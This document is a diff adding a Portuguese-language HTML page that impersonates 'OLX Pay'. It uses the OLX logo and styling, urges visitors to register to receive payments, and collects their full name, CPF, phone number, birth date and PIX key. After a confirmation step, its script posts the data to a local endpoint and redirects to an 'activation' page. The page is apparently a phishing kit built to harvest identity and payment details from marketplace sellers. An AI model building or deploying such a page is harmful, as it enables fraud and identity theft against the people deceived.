@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cadastro OLX Pay</title>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
+
+body{
+    background:#f2f4f5;
+    display:flex;
+    justify-content:center;
+    padding:20px;
+}
+
+.container{
+    background:#fff;
+    width:100%;
+    max-width:420px;
+    border-radius:14px;
+    padding:25px;
+    box-shadow:0 4px 15px rgba(0,0,0,0.08);
+}
+
+.header{text-align:center;margin-bottom:20px}
+.header img{width:85px}
+
+.title{
+    text-align:center;
+    font-size:18px;
+    font-weight:bold;
+    margin-bottom:15px;
+}
+
+.alert{
+    background:#fff4e5;
+    border-left:4px solid #f28000;
+    padding:10px;
+    border-radius:6px;
+    font-size:13px;
+    margin-bottom:15px;
+}
+
+.form-group{position:relative;margin-bottom:18px}
+
+input, select{
+    width:100%;
+    padding:14px 12px;
+    border-radius:8px;
+    border:1px solid #ccc;
+    font-size:14px;
+}
+
+input:focus, select:focus{
+    border:2px solid #6e0ad6;
+    outline:none;
+}
+
+label{
+    position:absolute;
+    left:12px;
+    top:14px;
+    font-size:13px;
+    color:#777;
+    background:#fff;
+    padding:0 4px;
+    transition:0.2s;
+    pointer-events:none;
+}
+
+input:focus + label,
+input:not(:placeholder-shown) + label{
+    top:-8px;
+    font-size:11px;
+    color:#6e0ad6;
+}
+
+.grid{
+    display:grid;
+    grid-template-columns:1fr 1fr 1.5fr;
+    gap:8px;
+}
+
+button{
+    width:100%;
+    background:#f28000;
+    color:#fff;
+    border:none;
+    padding:14px;
+    border-radius:30px;
+    font-weight:bold;
+    cursor:pointer;
+    margin-top:10px;
+    opacity:0.6;
+}
+
+button.active{opacity:1}
+
+.secondary{
+    background:#fff;
+    color:#f28000;
+    border:2px solid #f28000;
+}
+
+.error{color:red;font-size:12px;margin-top:4px}
+
+/* confirmação */
+.confirm-box{
+    background:#fafafa;
+    padding:15px;
+    border-radius:10px;
+    font-size:14px;
+}
+
+.confirm-box p{
+    margin-bottom:10px;
+}
+
+/* ===== LOADING SCREEN ===== */
+.loading-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: #f2f4f5;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    z-index: 9999;
+    gap: 20px;
+}
+
+.loading-overlay.active {
+    display: flex;
+    animation: fadeIn 0.3s ease-in;
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+}
+
+.loading-header {
+    margin-bottom: 40px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 15px;
+}
+
+.loading-logo {
+    font-size: 32px;
+    font-weight: 700;
+    letter-spacing: -1px;
+}
+
+.loading-logo span:nth-child(1) { color: #6e0ad6; }
+.loading-logo span:nth-child(2) { color: #00a650; }
+.loading-logo span:nth-child(3) { color: #ff6a00; }
+
+.spinner-simple {
+    width: 50px;
+    height: 50px;
+    border: 4px solid #f0f0f0;
+    border-top: 4px solid #6e0ad6;
+    border-radius: 50%;
+    animation: spinSimple 1s linear infinite;
+}
+
+@keyframes spinSimple {
+    to { transform: rotate(360deg); }
+}
+
+.loading-text {
+    color: #666;
+    font-size: 14px;
+    font-weight: 500;
+    letter-spacing: 0.5px;
+}
+
+</style>
+</head>
+
+<body>
+
+<!-- Loading Overlay -->
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-header">
+        <div class="loading-logo">
+            <span>o</span><span>l</span><span>x</span>
+        </div>
+    </div>
+    <div class="spinner-simple"></div>
+    <div class="loading-text">Salvando dados...</div>
+</div>
+
+<div class="container">
+
+<div class="header">
+<img src="https://upload.wikimedia.org/wikipedia/commons/e/ec/Logo_OLX_-_OK.png">
+</div>
+
+<div class="title">Cadastro OLX Pay</div>
+
+<div class="alert">⚠️ Preencha corretamente para receber pagamentos</div>
+
+<form id="form">
+
+<div class="form-group">
+<input type="text" id="nome" placeholder=" " required>
+<label>Nome completo</label>
+</div>
+
+<div class="form-group">
+<input type="text" id="cpf" placeholder=" " required>
+<label>CPF</label>
+<div class="error" id="erroCpf"></div>
+</div>
+
+<div class="form-group">
+<input type="tel" id="tel" placeholder=" " required>
+<label>Telefone</label>
+</div>
+
+<div class="grid">
+<div class="form-group">
+<input type="text" id="dia" placeholder=" ">
+<label>Dia</label>
+</div>
+
+<div class="form-group">
+<input type="text" id="mes" placeholder=" ">
+<label>Mês</label>
+</div>
+
+<div class="form-group">
+<input type="text" id="ano" placeholder=" ">
+<label>Ano</label>
+</div>
+</div>
+
+<div class="form-group">
+<select id="pix">
+<option value="">Tipo de chave PIX</option>
+<option>Email</option>
+<option>CPF</option>
+<option>Telefone</option>
+</select>
+</div>
+
+<div class="form-group">
+<input type="text" id="chave" placeholder=" ">
+<label>Chave PIX</label>
+</div>
+
+<button id="btn" disabled>Continuar</button>
+
+</form>
+
+<!-- CONFIRMAÇÃO -->
+<div id="confirmacao" style="display:none;">
+
+<div class="title">
+Falta pouco! Por favor, confirme os dados para recebimento
+</div>
+
+<div class="confirm-box">
+
+<p><b>Nome completo igual o RG</b><br><span id="c_nome"></span></p>
+
+<p><b>CPF</b><br><span id="c_cpf"></span></p>
+
+<p><b>Telefone</b><br><span id="c_tel"></span></p>
+
+<p><b>Data nascimento</b><br><span id="c_data"></span></p>
+
+<p><b>Chave PIX</b><br><span id="c_pix"></span></p>
+
+</div>
+
+<button id="confirmarFinal">Confirmar</button>
+
+<button class="secondary" onclick="voltarEdicao()">Editar dados</button>
+
+</div>
+
+</div>
+
+<script>
+
+/* máscara CPF */
+document.getElementById('cpf').addEventListener('input', e=>{
+let v=e.target.value.replace(/\D/g,'').slice(0,11)
+v=v.replace(/(\d{3})(\d)/,'$1.$2')
+v=v.replace(/(\d{3})(\d)/,'$1.$2')
+v=v.replace(/(\d{3})(\d{1,2})$/,'$1-$2')
+e.target.value=v
+})
+
+/* máscara telefone */
+document.getElementById('tel').addEventListener('input', e=>{
+let v=e.target.value.replace(/\D/g,'').slice(0,11)
+v=v.replace(/(\d{2})(\d)/,'($1) $2')
+v=v.replace(/(\d{5})(\d)/,'$1-$2')
+e.target.value=v
+})
+
+function validarCPF(cpf){
+return cpf.replace(/\D/g,'').length===11
+}
+
+const form=document.getElementById('form')
+const btn=document.getElementById('btn')
+
+form.addEventListener('input', ()=>{
+let nome=nomeValido()
+let cpf=validarCPF(document.getElementById('cpf').value)
+let tel=document.getElementById('tel').value.length>13
+let pix=document.getElementById('pix').value.length>0
+let chave=document.getElementById('chave').value.length>3
+
+if(nome && cpf && tel && pix && chave){
+btn.disabled=false
+btn.classList.add('active')
+}else{
+btn.disabled=true
+btn.classList.remove('active')
+}
+})
+
+function nomeValido(){
+return document.getElementById('nome').value.length>3
+}
+
+form.addEventListener('submit', e=>{
+e.preventDefault()
+
+let nome=document.getElementById('nome').value
+let cpf=document.getElementById('cpf').value
+let tel=document.getElementById('tel').value
+let dia=document.getElementById('dia').value
+let mes=document.getElementById('mes').value
+let ano=document.getElementById('ano').value
+let chave=document.getElementById('chave').value
+
+if(!validarCPF(cpf)){
+document.getElementById('erroCpf').innerText="CPF inválido"
+return
+}
+
+document.getElementById('c_nome').innerText=nome
+document.getElementById('c_cpf').innerText=cpf
+document.getElementById('c_tel').innerText=tel
+document.getElementById('c_data').innerText=`${dia}/${mes}/${ano}`
+document.getElementById('c_pix').innerText=chave
+
+form.style.display="none"
+document.getElementById('confirmacao').style.display="block"
+})
+
+function voltarEdicao(){
+document.getElementById('confirmacao').style.display="none"
+form.style.display="block"
+}
+
+document.getElementById('confirmarFinal').addEventListener('click', async ()=>{
+let nome=document.getElementById('nome').value
+let cpf=document.getElementById('cpf').value
+let tel=document.getElementById('tel').value
+let dia=document.getElementById('dia').value
+let mes=document.getElementById('mes').value
+let ano=document.getElementById('ano').value
+let pix=document.getElementById('pix').value
+let chave=document.getElementById('chave').value
+
+const btn = document.getElementById('confirmarFinal');
+const loadingOverlay = document.getElementById('loadingOverlay');
+btn.disabled = true;
+btn.textContent = 'Processando...';
+loadingOverlay.classList.add('active');
+
+try {
+    const response = await fetch('/api/enviar-cadastro-olx', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ 
+            nome: nome,
+            cpf: cpf,
+            telefone: tel,
+            data_nascimento: `${dia}/${mes}/${ano}`,
+            pix_tipo: pix,
+            pix_chave: chave
+        })
+    });
+
+    const resultado = await response.json();
+
+    if (response.ok && resultado.success) {
+        setTimeout(() => {
+            window.location.href = '/ativar.html';
+        }, 2000);
+    } else {
+        loadingOverlay.classList.remove('active');
+        alert(resultado.message || 'Erro ao confirmar dados');
+        btn.disabled = false;
+        btn.textContent = 'Confirmar';
+    }
+} catch (error) {
+    loadingOverlay.classList.remove('active');
+    console.error('Erro ao confirmar dados:', error);
+    alert('Erro ao conectar com o servidor');
+    btn.disabled = false;
+    btn.textContent = 'Confirmar';
+}
+})
+
+</script>
+
+</body>
+</html>
